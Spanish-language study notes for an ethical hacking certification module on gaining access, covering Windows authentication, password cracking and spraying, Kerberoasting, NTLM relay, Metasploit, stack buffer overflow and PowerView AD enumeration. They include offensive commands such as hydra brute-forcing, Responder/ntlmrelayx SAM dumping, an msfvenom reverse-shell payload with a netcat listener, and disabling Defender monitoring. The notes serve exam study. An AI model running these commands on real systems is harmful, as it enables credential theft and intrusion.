# M06 — Gaining Access
### Parte 1: Password Cracking · Vulnerability Exploitation · Buffer Overflow · AD Enumeration

---

## 1. Fundamentos: Autenticación en Windows

Antes de hablar de cómo se crackean contraseñas, hay que entender cómo Windows las gestiona, porque el ataque siempre va contra el mecanismo de autenticación.

### SAM Database 🔴

Windows almacena las contraseñas en la **Security Accounts Manager (SAM) database**, nunca en texto plano, sino en formato hash (función unidireccional). El fichero SAM se encuentra en `%SystemRoot%\system32\config\SAM` y se monta en el registro bajo `HKEY_LOCAL_MACHINE\SAM`. Mientras Windows está activo, el kernel mantiene un **lock exclusivo** sobre ese fichero: no se puede copiar ni mover. El lock solo se libera si hay una pantalla azul o el sistema se apaga. Para saltarse esto en ataques offline, los atacantes vuelcan el contenido del SAM usando herramientas especializadas.

El SAM usa la función **SYSKEY** (desde Windows NT 4.0) para cifrar parcialmente los hashes. Además, para contraseñas de más de 14 caracteres, el hash LM no se puede calcular, por lo que el sistema almacena un valor ficticio ("dummy value") sin relación con la contraseña real.

**Herramientas para extraer hashes del SAM:** pwdump7, Mimikatz, DSInternals, hashcat, PyCrack. Todas requieren **privilegios de administrador**.

### NTLM Authentication 🔴

NTLM es el esquema de autenticación por desafío-respuesta que Windows usó por defecto antes de Kerberos. Incluye tres variantes: **LM, NTLMv1 y NTLMv2**, que difieren únicamente en el nivel de cifrado aplicado. El proceso funciona así:

1. El cliente escribe usuario y contraseña.
2. Windows genera un hash de esa contraseña.
3. El cliente envía una solicitud de login con el nombre de dominio al DC.
4. El DC genera un **nonce** (cadena aleatoria de 16 bytes) y lo envía al cliente.
5. El cliente cifra el nonce con el hash de la contraseña y lo devuelve.
6. El DC recupera el hash del SAM, cifra el mismo nonce, y compara: si coincide, autentica al usuario.

La clave aquí es que **la contraseña nunca viaja por la red**, solo el hash cifrado. Esto es exactamente lo que explotan los ataques Pass-the-Hash.

**LM Hash** es el más débil y está deshabilitado por defecto desde Vista. Las versiones nuevas de Windows almacenan un valor ficticio en su lugar. No soporta contraseñas de más de 14 caracteres.

### Kerberos Authentication 🔴

Kerberos es el protocolo de autenticación por defecto en entornos de dominio modernos y es más robusto que NTLM porque ofrece **autenticación mutua** (ambas partes se verifican entre sí) y protección contra replay attacks y eavesdropping.

Elementos clave de Kerberos:
- **KDC (Key Distribution Center):** tercero de confianza que gestiona toda la autenticación.
- **AS (Authentication Server):** parte del KDC que autentica al usuario inicialmente.
- **TGS (Ticket Granting Server):** parte del KDC que emite tickets de servicio.
- **TGT (Ticket Granting Ticket):** ticket que obtiene el usuario tras autenticarse; lo usa para pedir acceso a servicios sin reintroducir contraseña (Single Sign-On).
- **ST / Service Ticket:** ticket específico para acceder a un servicio concreto.

Importante: **no hay comunicación directa entre el servidor de aplicación y el KDC**. Los tickets pasan siempre a través del cliente.

---

## 2. Clasificación de los Ataques de Contraseña

Todos los ataques de contraseña caen en una de estas cuatro categorías, y el examen las pregunta tanto por nombre como por técnica específica:

**Non-Electronic Attacks** son los que no requieren conocimiento técnico. El atacante opera en el mundo físico: hombro sobre hombro (shoulder surfing), ingeniería social, o rebuscando en la basura (dumpster diving). Son el primer intento de un atacante porque no dejan rastro digital.

**Active Online Attacks** son los que requieren comunicación directa con la máquina objetivo. Son más ruidosos y detectables. Incluyen: guessing, dictionary, brute-force, spraying, hash injection, LLMNR poisoning, Kerberoasting, etc.

**Passive Online Attacks** no interactúan con el sistema; el atacante observa el tráfico. Incluyen: wire sniffing, MITM y replay attacks.

**Offline Attacks** ocurren cuando el atacante ya tiene los hashes y trabaja fuera de línea para revertirlos. Incluyen: rainbow table attacks y Distributed Network Attacks (DNA).

---

## 3. Non-Electronic Attacks

### Shoulder Surfing
El atacante observa físicamente a la víctima mientras introduce sus credenciales. Funciona en proximidad física y también en cajeros o terminales de punto de venta. Es trivial de ejecutar contra PINs de 4 dígitos.

### Social Engineering
El atacante manipula psicológicamente a personas para que revelen información o rompan procedimientos de seguridad. Explota la tendencia humana a ser confiado y servicial. La mejor defensa es formación y concienciación.

### Dumpster Diving
Buscar en la basura física documentos desechados: listados de contraseñas, manuales, informes, números de tarjeta. La información que parecía inofensiva al tirarla puede usarse para construir ataques más elaborados como social engineering.

---

## 4. Active Online Attacks

### Dictionary Attack
Se carga un fichero de texto con palabras comunes en una herramienta de cracking que prueba cada entrada contra la cuenta objetivo. Los diccionarios modernos no son solo palabras del idioma: incluyen sustituciones (e→3, i→1, o→0), combinaciones con números, contraseñas de brechas previas, y términos técnicos. **No funciona contra passphrases** complejas sin un diccionario adaptado. La herramienta de referencia es **John the Ripper** con el wordlist `rockyou.txt`.

Flujo con John the Ripper:
```
# Generar wordlist personalizado modificando john.conf para el formato deseado
john --wordlist=/path/rockyou.txt /path/output_wordlist.txt

# Crackear hashes NTLM con reglas
john --rules --wordlist=/path/output_wordlist.txt --format=NT /path/ntlm_hashes.txt

# Ver contraseñas crackeadas
john --show /path/ntlm_hashes.txt
```

### Brute-Force Attack
Prueba todas las combinaciones posibles de caracteres hasta encontrar la correcta. Es garantizado que eventualmente encuentra la contraseña, pero puede ser inviable en tiempo si la contraseña es larga y compleja. Su única limitación real es el tiempo de cómputo.

### Rule-Based Attack
Se usa cuando el atacante tiene información parcial sobre la contraseña (longitud, uso de números, patrones de mayúsculas). Es más eficiente que el brute-force puro porque reduce el espacio de búsqueda. Combina técnicas:
- **Hybrid attack:** toma palabras del diccionario y añade números o símbolos al final o principio (system → system1, system2).
- **Syllable attack:** combina todas las palabras del diccionario entre sí para generar contraseñas complejas no reconocibles.

### Password Spraying Attack 🔴
En lugar de atacar una cuenta con muchas contraseñas (lo que activa el lockout), el atacante usa **una sola contraseña común contra muchas cuentas simultáneamente**, y luego espera antes de intentar la siguiente. El objetivo es mantenerse por debajo del umbral de bloqueo de cuentas. Se dirige a grupos de trabajo enteros, no a usuarios individuales.

Puertos usados comúnmente para password spraying:
- MSSQL: 1433/TCP
- SSH: 22/TCP
- FTP: 21/TCP
- SMB: 445/TCP
- Telnet: 23/TCP
- Kerberos: 88/TCP

Herramienta principal: **thc-hydra**. Sintaxis clave:
```bash
hydra -l admin -p password ftp://localhost/         # usuario y contraseña únicos
hydra -L logins.txt -P passwords.txt ftp://localhost/ # listas de usuario y contraseña
hydra -l admin -P common_passwords.txt ftp://localhost/ # usuario fijo, lista de passwords
```
- `-l` = login único | `-L` = lista de logins
- `-p` = password única | `-P` = lista de passwords

### Mask Attack 🔴
Similar al brute-force pero más inteligente: el atacante conoce alguna característica de la contraseña (longitud, posición de mayúsculas, que empieza por número) y construye una **máscara** que reduce el espacio de búsqueda. Herramienta: **hashcat**.

Charsets integrados de hashcat:
- `?l` = minúsculas (a-z)
- `?u` = mayúsculas (A-Z)
- `?d` = dígitos (0-9)
- `?s` = caracteres especiales
- `?a` = todos los anteriores (?l?u?d?s)

Ejemplo: crackear hash MD5 de 8 chars donde el primero es mayúscula o minúscula, los últimos cuatro son dígitos con los dos primeros siendo "19":
```
hashcat -a 3 -m 0 md5_hashes.txt -1 ?l?u ?1?l?l?l19?d?d
```
Para longitud desconocida: `--increment --increment-min=6 --increment-max=10`

### Password Guessing
El atacante intenta manualmente combinaciones de contraseñas basadas en información recopilada (nombre, fecha de nacimiento, mascota). Puede automatizarse con un simple bucle FOR en Windows:
```
FOR /F "tokens=1,2*" %i in (credentials.txt) do net use \\victim.com\IPC$ %j /u:victim.com\%i
```
Las credenciales correctas se guardan en `outfile.txt`. Las contraseñas por defecto de fabricantes (routers, switches) son un objetivo frecuente en este tipo de ataque.

### Trojans, Spyware y Keyloggers
El atacante instala software malicioso en la máquina de la víctima que captura credenciales. Un **keylogger** registra todas las pulsaciones y las envía al atacante. Un **troyano** aparenta ser software legítimo pero ejecuta funciones maliciosas en segundo plano. El **spyware** recopila información sin conocimiento del usuario. Estos programas se ejecutan en background y son difíciles de detectar.

### Hash Injection / Pass-the-Hash (PtH) Attack 🔴
Este ataque explota que Windows puede autenticarse directamente con el hash de la contraseña, sin necesidad de conocer la contraseña en texto claro. El proceso:

1. El atacante compromete una workstation o servidor con un exploit local o remoto.
2. Extrae los hashes del SAM usando herramientas como **Mimikatz**.
3. Encuentra el hash de una cuenta de administrador de dominio.
4. Inyecta ese hash en el proceso **lsass.exe** local.
5. Usa ese hash para autenticarse en cualquier sistema del dominio con las mismas credenciales (por ejemplo, el Domain Controller).
6. Extrae todos los hashes del Active Directory.
7. Puede comprometer cualquier cuenta del dominio.

El ataque funciona sobre cualquier sistema con autenticación NTLM o LM (Windows, Unix, etc.). Windows es especialmente vulnerable por su feature de **Single Sign-On (SSO)**, que almacena hashes en memoria para facilitar el acceso a recursos.

### LLMNR/NBT-NS Poisoning 🔴
**LLMNR** (Link Local Multicast Name Resolution) y **NBT-NS** (NetBIOS Name Service) son servicios de resolución de nombres de Windows que se activan cuando el DNS falla. Cuando un host no puede resolver un nombre vía DNS, lanza una **broadcast UDP no autenticada** a toda la red preguntando si alguien conoce ese nombre.

El atacante escucha pasivamente esas broadcasts (LLMNR en UDP 5355, NBT-NS en UDP 137) y responde haciéndose pasar por el host buscado. La víctima, creyendo que ha encontrado el servidor correcto, inicia la autenticación enviando su **hash NTLMv2**. El atacante captura ese hash y puede crackearlo offline con hashcat o John the Ripper.

Flujo del ataque paso a paso:
1. La usuaria intenta conectarse a `\\DataServer` pero escribe mal `\\DtaServr`.
2. El DNS no encuentra `\\DtaServr` y lo comunica.
3. La máquina lanza un broadcast LLMNR/NBT-NS preguntando si alguien conoce `\\DtaServr`.
4. El atacante responde diciendo "soy yo" y acepta la conexión.
5. La víctima envía su hash NTLMv2 en el proceso de autenticación.
6. El atacante devuelve un error (como si el servidor no funcionara) y guarda el hash en disco.
7. El hash se crackea offline con hashcat o John the Ripper.

Herramienta: **Responder** (también envenena MDNS). Detectores: Vindicate, Respounder, got-responded.

**Defensa:** deshabilitar LLMNR en Group Policy (DNS Client → Turn off multicast name resolution → Enabled) y deshabilitar NBT-NS en propiedades TCP/IPv4 → Advanced → WINS → Disable NetBIOS over TCP/IP. Monitorizar puertos UDP 5355 y 137.

### Internal Monologue Attack
Es como Mimikatz pero sin tocar la memoria de LSASS, lo que evita Windows Credential Guard y el antivirus. Usa la **SSPI (Security Support Provider Interface)** desde user-mode para hacer una llamada local al paquete de autenticación NTLM y obtener la respuesta NetNTLMv1 en el contexto del usuario autenticado.

Pasos:
1. Desactiva los controles de seguridad de NetNTLMv1 modificando `LMCompatibilityLevel`, `NTLMMinClientSec`, y `RestrictSendingNTLMTraffic`.
2. Extrae todos los tokens de sesiones no-red de los procesos activos para suplantar usuarios legítimos.
3. Interactúa con NTLM SSP localmente para obtener respuestas NetNTLMv1.
4. Restaura los valores originales de los registros modificados.
5. Usa rainbow tables para crackear los hashes capturados.
6. Usa los hashes crackeados para obtener acceso a nivel de sistema.

### Kerberos Password Cracking: AS-REP Roasting 🔴
Ataca cuentas que tienen **deshabilitada la preautenticación Kerberos** (opción "Do not require Kerberos preauthentication"). Por defecto, Kerberos exige que el cliente demuestre conocer su contraseña antes de emitir un TGT. Si ese requisito está desactivado, el atacante puede solicitar un TGT para ese usuario **sin conocer su contraseña**.

Pasos:
1. El atacante escanea el AD buscando cuentas sin preautenticación requerida.
2. Envía una solicitud AS-REQ al DC para cada cuenta vulnerable.
3. El DC responde con un TGT cifrado con el hash de la contraseña del usuario (AS-REP).
4. El atacante extrae el TGT usando herramientas como **GetNPUsers.py** o **Rubeus**.
5. Crackea el TGT offline con **hashcat** o **John the Ripper** para obtener la contraseña en texto claro.
6. Usa las credenciales para acceso no autorizado.

Herramienta de extracción: `GetNPUsers.py` (Impacket). Herramienta de cracking: hashcat / John the Ripper.

### Kerberoasting (Cracking TGS) 🔴
Ataca **cuentas de servicio** con SPN (Service Principal Name) registrado. Cualquier usuario del dominio con credenciales válidas puede solicitar un TGS para esas cuentas. Partes del TGS están cifradas con el hash de la contraseña de la cuenta de servicio usando **RC4**. El atacante extrae esos tickets y los crackea offline.

Pasos:
1. El atacante se autentica en el dominio con una cuenta legítima (cualquier usuario válido) y obtiene un TGT.
2. Usa el TGT para solicitar TGS tickets de cuentas de servicio con SPN.
3. Extrae los TGS de la memoria del sistema usando **Rubeus**.
4. Crackea los tickets offline con hashcat o John the Ripper para obtener la contraseña de la cuenta de servicio.
5. Las cuentas de servicio suelen tener privilegios elevados → escalada de privilegios.

**Diferencia clave con AS-REP Roasting:** Kerberoasting ataca cuentas de **servicio** (con SPN) usando TGS; AS-REP Roasting ataca cuentas de **usuario** con preautenticación desactivada usando TGT.

### Pass-the-Ticket Attack
El atacante roba tickets Kerberos (TGT o ST) de máquinas comprometidas y los reutiliza para acceder a servicios sin necesidad de contraseña. Existen dos variantes de tickets especialmente valiosas:

- **Silver Ticket:** ticket falsificado para un servicio específico; no requiere comunicación con el KDC.
- **Golden Ticket:** ticket falsificado para cualquier cuenta del dominio, creado con el hash NTLM de la cuenta **KRBTGT**; proporciona acceso total al dominio.

Herramientas: **Mimikatz**, **Rubeus**, Windows Credentials Editor.

### NTLM Relay Attack
El atacante intercepta una solicitud de autenticación NTLM de un cliente y la reenvía a otro servidor haciéndose pasar por ese cliente. No necesita crackear el hash: directamente usa la autenticación en tránsito.

Pasos con Responder + ntlmrelayx:
```bash
# Paso 1: Lanzar Responder para envenenar LLMNR/NBT-NS y capturar hashes
./Responder -I eth0

# Paso 2: Configurar ntlmrelayx para reenviar la autenticación al objetivo
impacket-ntlmrelayx.py -of <SAM-dump-path> -tf <target-list> -smb2support

# Paso 3: Cuando un usuario accede al share SMB, se vuelcan los hashes del SAM del objetivo
```

### Otros ataques activos online

**Combinator Attack:** combina entradas de dos diccionarios distintos. Si el primer diccionario tiene 100 palabras y el segundo tiene 70, el resultado tiene 7.000 combinaciones (100×70). Útil cuando la política de contraseñas exige frases de varias palabras.

**Fingerprint Attack:** descompone una passphrase en "fingerprints" (combinaciones de 1 y varios caracteres) que el usuario podría haber usado. Por ejemplo, "password" genera "p", "pa", "pas", "ss", "wo", etc. Útil para contraseñas complejas como "pass-10".

**PRINCE Attack (PRobability INfinite Chained Elements):** variante avanzada del combinator que usa un solo diccionario para construir cadenas de palabras concatenadas de longitud variable. Genera desde 1 hasta N palabras encadenadas según la longitud objetivo.

**Toggle-Case Attack:** prueba todas las combinaciones posibles de mayúsculas y minúsculas de una palabra. "xyz" genera "Xyz", "xYz", "XYz", "XYZ", etc. Baja tasa de éxito porque los usuarios generalmente solo usan mayúscula inicial o alguna mayúscula en medio.

**Markov-Chain Attack:** recopila una base de datos de contraseñas, la divide en bigramas y trigramas (2 y 3 caracteres), construye un nuevo "alfabeto" con los elementos más frecuentes, y genera palabras de máximo 8 caracteres que luego usa en un ataque de diccionario.

**GPU-based Attack:** usa las APIs OpenGL/CUDA de la GPU (accesibles sin privilegios de administrador) para ejecutar malware en el navegador y capturar lo que el usuario escribe en campos de contraseña mediante side-channel leaks.

---

## 5. Passive Online Attacks

### Wire Sniffing
El atacante captura paquetes en tránsito en la red. En una red con hub (broadcast medium), cualquier máquina puede ver el tráfico de todas las demás. Las herramientas de sniffing funcionan en la capa de enlace de datos y pueden capturar credenciales de protocolos como FTP, rlogin, HTTP, SMTP y SMB que transmiten en texto claro.

### MITM y Replay Attacks
En un **ataque MITM**, el atacante se interpone entre cliente y servidor, leyendo y potencialmente modificando el tráfico en ambas direcciones sin que ninguna de las partes lo sepa. Es técnicamente complejo porque requiere sniffar ambos extremos de la conexión simultáneamente.

En un **replay attack**, el atacante captura tokens de autenticación o paquetes válidos con un sniffer y los reinyecta en la red para autenticarse o repetir una transacción (por ejemplo, un depósito bancario).

---

## 6. Offline Attacks

### Rainbow Table Attack 🔴
Usa una técnica de **time-memory trade-off**: en lugar de calcular hashes en tiempo real durante el ataque, el atacante **precalcula** todos los hashes posibles y los almacena en una tabla. Durante el ataque, solo tiene que buscar el hash capturado en la tabla para obtener la contraseña en texto claro. Es mucho más rápido que el brute-force, pero requiere espacio de almacenamiento considerable.

Herramienta de generación de rainbow tables: **rtgen** (proyecto RainbowCrack).
```
rtgen hash_algorithm charset plaintext_len_min plaintext_len_max table_index chain_len chain_num part_index
```
Herramienta de cracking con rainbow tables: **RainbowCrack**.

**Defensa contra rainbow tables: password salting.** Un salt es una cadena aleatoria de bits que se añade a la contraseña antes de calcular el hash. Esto genera hashes diferentes para la misma contraseña, lo que hace que las rainbow tables precalculadas sean inútiles. Los algoritmos modernos seguros (bcrypt, Argon2, PBKDF2) implementan salting de forma nativa.

### Distributed Network Attack (DNA)
Aprovecha la potencia de cómputo no utilizada de múltiples máquinas en red para crackear contraseñas en paralelo. Un **DNA Manager** central coordina el trabajo y distribuye porciones pequeñas del espacio de claves a los **DNA Clients** distribuidos en la red. Los clientes trabajan en segundo plano usando solo los ciclos de CPU libres. Herramienta: **Exterro Password Recovery Toolkit (PRTK)**.

---

## 7. Herramientas de Password Cracking

**John the Ripper:** herramienta versátil de cracking que soporta diccionario, brute-force, y ataques basados en reglas. Puede crackear hashes NTLM, MD5, SHA, etc.

**hashcat:** especializado en mask attacks y ataques con GPU. Soporta docenas de algoritmos hash.

**L0phtCrack:** auditoría de contraseñas Windows; soporta diccionario, rainbow table, híbrido y brute-force.

**THC-Hydra:** brute-force online contra protocolos de red (FTP, SSH, HTTP, SMB, etc.).

**RainbowCrack:** cracking offline usando rainbow tables precalculadas.

**Mimikatz:** extracción de contraseñas en texto claro, hashes NTLM, tickets Kerberos y PINs directamente desde la memoria LSASS. Herramienta de post-explotación por excelencia.

---

## 8. Vulnerability Exploitation

### El proceso de explotación paso a paso 🔴

La explotación no es simplemente "lanzar un exploit". Tiene una metodología:

1. **Identificar la vulnerabilidad:** usando técnicas de footprinting, scanning, enumeración y análisis de vulnerabilidades. También buscando en Exploit-DB o Packet Storm.
2. **Determinar el riesgo:** ¿explotar esta vulnerabilidad rompe las medidas de seguridad existentes?
3. **Determinar la capacidad:** si el riesgo es bajo, ¿permite igualmente acceso remoto?
4. **Desarrollar el exploit:** descargar de exploit sites o desarrollar con Metasploit.
5. **Seleccionar el método de entrega:** local (si ya tiene acceso, para escalar privilegios) o remoto (para obtener acceso inicial vía red).
6. **Generar y entregar el payload:** usar msfvenom u otras herramientas para crear el shellcode y entregarlo vía ingeniería social o red.
7. **Obtener acceso remoto:** ejecutar el exploit y obtener shell remota.

### Proof of Concept (PoC)
Un PoC es la demostración técnica de que una vulnerabilidad existe y puede ser explotada. Consiste en código, instrucciones o un script que permite acceso no autorizado, ejecución de código arbitrario u otras acciones maliciosas. Los investigadores crean PoCs para validar la severidad de una vulnerabilidad. **Riesgo:** si se publica un PoC antes de que el parche esté disponible, puede desencadenar explotación zero-day.

### Exploit Sites
- **Exploit Database (exploit-db.com):** repositorio de exploits para sistemas, dispositivos y aplicaciones.
- **VulDB (vuldb.com):** vulnerabilidades y exploits ordenados por probabilidad de explotación.
- **OSV (osv.dev):** base de datos para proyectos open source.
- **MITRE CVE (cve.org):** base de datos oficial de CVEs.

### WES-NG (Windows Exploit Suggester - Next Generation)
Herramienta Python que compara la salida de `systeminfo.exe` con una base de datos de vulnerabilidades para sugerir exploits aplicables al sistema Windows objetivo:
```bash
systeminfo > systeminfo.txt     # Obtener info del sistema
wes systeminfo.txt              # Ver vulnerabilidades
wes -e systeminfo.txt           # Ver vulnerabilidades con exploits disponibles
```

---

## 9. Metasploit Framework 🔴

Metasploit es la plataforma de pentesting más usada del mundo. Es modular, open-source, y permite desarrollo rápido de exploits reutilizando código entre módulos.

### Módulos de Metasploit

**Exploit Module:** encapsula un único exploit para múltiples plataformas. Permite modificar el comportamiento dinámicamente mediante Mixins. Para usar un exploit:
1. Configurar el exploit activo (`use exploit/...`)
2. Verificar opciones (`show options`)
3. Seleccionar objetivo (`set TARGET`)
4. Seleccionar payload (`set PAYLOAD`)
5. Lanzar (`exploit` o `run`)

**Payload Module:** código que se ejecuta en el sistema comprometido después del exploit. Tres tipos:
- **Singles:** autocontenidos y completamente independientes.
- **Stagers:** establecen la conexión de red entre atacante y víctima.
- **Stages:** descargados por los stagers; son el payload real (ej. Meterpreter).

**Auxiliary Module:** acciones puntuales sin explotar: port scanning, DoS, fuzzing, etc. Se listan con `show auxiliary` y se ejecutan con `run` o `exploit`.

**NOP Module:** genera instrucciones NOP (No Operation) para rellenar buffers. Útil en exploits que necesitan un NOP sled. Se genera con el comando `generate -t c <tamaño>`.

**Encoder Module:** codifica los payloads para evadir antivirus e IDS que detectan por firmas. Técnicas: obfuscación, cambio de patrones de bytes, polimorfismo (variar el payload en cada generación).

**Evasion Module:** modifica el comportamiento de payloads y exploits para evadir defensas específicas. Ejemplos: `evasion/windows/windows_defender_exe` (evade Windows Defender), `evasion/windows/antivirus_disable` (desactiva el AV).

**Post-Exploitation Module:** actúa después de comprometer el sistema. Permite: recopilar información, escalar privilegios, mantener acceso, y moverse lateralmente. Ejemplos importantes:
- `post/windows/gather/enum_logged_on_users`: enumera usuarios conectados.
- `post/windows/gather/credentials/credential_collector`: recopila credenciales.
- `post/linux/gather/hashdump`: vuelca hashes de Linux.
- `post/multi/manage/autoroute`: pivoting a través del sistema comprometido.

---

## 10. Buffer Overflow 🔴

### El concepto fundamental
Un buffer es un área de memoria contigua asignada a un programa para datos temporales. El **buffer overflow** ocurre cuando se escribe más datos en el buffer de los que caben, desbordando hacia áreas de memoria adyacentes. Esto puede corromper datos, causar crashes, o —lo más peligroso— **permitir al atacante controlar el flujo de ejecución del programa**.

Causas principales: falta de comprobación de límites (bounds checking), uso de funciones inseguras como `strcpy()`, mala gestión de memoria, y código antiguo sin validación de input.

### Stack-Based Buffer Overflow 🔴

La pila (stack) usa asignación estática de memoria en orden **LIFO**. Los registros clave para entender este ataque son:
- **EBP (Extended Base Pointer):** dirección del primer elemento de datos en el stack frame actual.
- **ESP (Extended Stack Pointer):** dirección del siguiente elemento a añadir al stack.
- **EIP (Extended Instruction Pointer):** 🔴 dirección de la **próxima instrucción a ejecutar**. Es el objetivo del atacante.
- **ESI / EDI:** índices de fuente y destino para operaciones con strings.

El funcionamiento normal: cuando se llama a una función, se apila su stack frame en ESP. Al retornar, el frame se desapila y la ejecución continúa desde la dirección guardada en EIP.

**El ataque:** si un programa no valida el tamaño del input, el atacante puede escribir más datos de los que caben en el buffer, avanzar hasta sobreescribir EIP, y reemplazar la dirección de retorno con la dirección de su shellcode malicioso. A partir de ahí, el programa ejecuta el código del atacante.

### Workflow de explotación de buffer overflow en Windows 🔴

La explotación se hace en 8 pasos, usando **Immunity Debugger** + servidor vulnerable:

**1. Spiking:** enviar paquetes TCP/UDP malformados para identificar qué función del servidor es vulnerable al overflow. Herramienta: `generic_send_tcp`. Si el servidor crashea y sobrescribe registros como EAX, ESP, EBP, EIP → función vulnerable encontrada.

**2. Fuzzing:** enviar cantidades crecientes de datos a la función vulnerable para determinar aproximadamente cuántos bytes son necesarios para causar el crash. Un script Python envía buffers que crecen en cada iteración hasta que el servidor cae.

**3. Identificar el offset:** saber exactamente en qué byte del buffer se encuentra EIP. Usando `pattern_create.rb` de Metasploit se genera un patrón único, se envía al servidor, se observa qué valor tiene EIP tras el crash, y se usa `pattern_offset.rb` con ese valor para encontrar el offset exacto.
```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 10400
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 10400 -q <EIP_value>
```

**4. Sobreescribir EIP:** verificar que se puede controlar EIP enviando exactamente `offset` bytes de relleno seguidos de 4 bytes conocidos (ej. "BBBB") y confirmar que EIP muestra `42424242`.

**5. Identificar bad characters:** ciertos bytes (como `\x00` null byte) truncan el shellcode. Se envían todos los bytes posibles (0x00-0xFF) y se observa en el dump de memoria cuáles causan problemas. Esos bytes se excluyen al generar el shellcode.

**6. Identificar el módulo correcto:** encontrar un módulo del servidor (ej. DLL) que no tenga protecciones de memoria (sin ASLR, sin DEP). En Immunity Debugger: `!mona modules`. Una vez identificado el módulo sin protección, buscar la instrucción `JMP ESP` dentro de él para usarla como dirección de retorno:
```
!mona find -s "\xff\xe4" -m essfunc.dll
```
La arquitectura x86 usa **Little Endian**: la dirección se invierte byte a byte al inyectarla (ej. `625011af` → `\xaf\x11\x50\x62`).

**7. Generar shellcode:** usar msfvenom para generar el shellcode, excluyendo los bad characters:
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<puerto> EXITFUNC=thread -f c -a x86 -b "\x00"
```
- `-p` payload | `LHOST` IP del atacante | `LPORT` puerto de escucha
- `-f c` formato C | `-a x86` arquitectura | `-b` bad characters

**8. Obtener shell:** escuchar con Netcat (`nc -nvlp 4444`), ejecutar el exploit con el shellcode inyectado, y obtener shell inversa en el sistema objetivo.

### Heap-Based Buffer Overflow
El heap es memoria dinámica asignada en tiempo de ejecución (`malloc()`/`free()`). Es más lento de acceder que el stack, y su gestión es manual. Los overflows en heap sobreescriben estructuras dinámicas: punteros de objetos, virtual function tables, headers del heap. Son más inconsistentes que los stack overflows y su explotación varía según la implementación, pero son igual de peligrosos.

### Técnicas avanzadas de evasión de protecciones

**ASLR (Address Space Layout Randomization):** aleatoriza las direcciones de memoria del proceso en cada ejecución, dificultando predecir dónde está el payload.

**DEP (Data Execution Prevention):** marca regiones de memoria (como el stack) como no ejecutables, impidiendo ejecutar código inyectado en ellas.

**ROP (Return-Oriented Programming):** técnica para bypassear DEP. En lugar de inyectar código nuevo, el atacante reutiliza pequeñas secuencias de instrucciones existentes en las librerías del programa (llamadas **gadgets**) que terminan con la instrucción `RET`. Encadenando gadgets, construye un programa malicioso sin necesidad de inyectar código ejecutable nuevo. Como usa código legítimo ya presente en el sistema, bypassa tanto DEP como code signing.

**Heap Spraying:** inunda el heap con múltiples copias del payload malicioso. Aunque ASLR aleatoriza las direcciones, con suficiente volumen de datos el payload queda en una región de memoria predecible. Si el exploit puede redirigir la ejecución a cualquier punto del heap, es muy probable que aterrice en el código malicioso. Bypassa tanto ASLR como DEP (usando gadgets ROP para la ejecución).

**JIT Spraying:** usa la predictibilidad del compilador JIT de navegadores web. El atacante inyecta JavaScript malicioso que, al ser compilado JIT, genera código máquina en posiciones de memoria predecibles. Bypassa ASLR (por la predictibilidad del JIT) y DEP (el JIT marca su código como ejecutable).

**Exploit Chaining:** combina múltiples vulnerabilidades en secuencia para comprometer el sistema desde la raíz. El atacante encadena exploits que individualmente darían acceso limitado pero juntos escalan hasta kernel/root level. Es más difícil de detectar y remediar cuanto más larga es la cadena.

---

## 11. AD Enumeration con PowerView

### Contexto
Tras comprometer una cuenta de dominio, el atacante enumera el Active Directory para mapear el entorno y encontrar rutas de ataque. **PowerView** es una herramienta PowerShell para este fin. Antes de usarla, se desactiva el monitoreo en tiempo real:
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

### Comandos esenciales de PowerView para el examen

**Dominio:**
- `Get-ADDomain` / `Get-NetDomain`: info del dominio actual (DCs incluidos).
- `Get-DomainSID`: SID del dominio.
- `Get-DomainPolicy`: política del dominio. `(Get-DomainPolicy)."kerberospolicy"` → política Kerberos.

**Domain Controllers:**
- `Get-NetDomainController`: info del DC (forest, OS, roles, IP).

**Usuarios:**
- `Get-NetUser`: todos los usuarios del dominio.
- `Get-UserProperty -Properties pwdlastset`: fecha del último cambio de contraseña.
- `Find-LocalAdminAccess`: usuarios con acceso de admin local.
- `Get-NetLoggedon -ComputerName <name>`: usuarios activos en una máquina.

**Ordenadores:**
- `Get-NetComputer`: todos los equipos del dominio.
- `Get-NetComputer -OperatingSystem "*Server 2022*"`: filtrar por OS.
- `Get-NetComputer -Ping`: solo hosts activos.

**Grupos:**
- `Get-NetGroup`: todos los grupos. `Get-NetGroup "*admin*"`: grupos con "admin" en el nombre.
- `Get-NetGroupMember -GroupName "Domain Admins"`: miembros de Domain Admins.

**Shares:**
- `Invoke-ShareFinder -Verbose`: shares en todos los hosts del dominio.
- `Invoke-FileFinder`: ficheros con credenciales.

**GPOs y OUs:**
- `Get-NetGPO`: lista de GPOs. `Get-NetGPO | select displayname`: nombres de GPOs.
- `Get-NetOU`: lista de OUs.

**ACLs:**
- `Get-ObjectAcl -SamAccountName "users" -ResolveGUIDs`: ACLs de un grupo.
- `Invoke-ACLScanner -ResolveGUIDs`: encuentra ACLs mal configuradas.

**Trusts y Forests:**
- `Get-NetForest`: info del forest actual.
- `Get-NetForestDomain`: todos los dominios del forest.
- `Get-NetForestCatalog`: global catalogs.
- One-way trust: permite acceso unidireccional (dominio A accede a B, no al revés).
- Two-way trust: acceso bidireccional.

### BloodHound
Herramienta de análisis de AD que usa **teoría de grafos** para visualizar relaciones y rutas de ataque ocultas en entornos de Active Directory. Combina un colector de datos en C# con una aplicación web JavaScript sobre Neo4j. Permite identificar visualmente el camino más corto hacia Domain Admin.

### GhostPack Seatbelt
Conjunto de herramientas C# para reconocimiento del host desde perspectiva ofensiva/defensiva. Realiza checks de seguridad sobre la configuración del sistema.
```
Seatbelt.exe -group=all       # Todos los checks
Seatbelt.exe -group=system    # Info del sistema (AV, AppLocker, NTLM settings, etc.)
Seatbelt.exe -group=user      # Info del usuario (credenciales, historial PowerShell, etc.)
Seatbelt.exe -group=remote    # Checks relevantes para acceso remoto
```

---

## 3. Exam Traps ⚠️

⚠️ **[LM vs NTLM Hash]** — El examen puede preguntar cuál es más débil. LM es el más débil y está **deshabilitado por defecto desde Windows Vista**. Las versiones nuevas almacenan un valor ficticio en lugar del LM hash real. NTLM lo reemplaza.

⚠️ **[NTLM vs Kerberos]** — El examen puede preguntar cuál ofrece autenticación mutua. **Kerberos** ofrece autenticación mutua (servidor y usuario se verifican mutuamente); NTLM no. Kerberos es el protocolo por defecto en dominios Windows modernos.

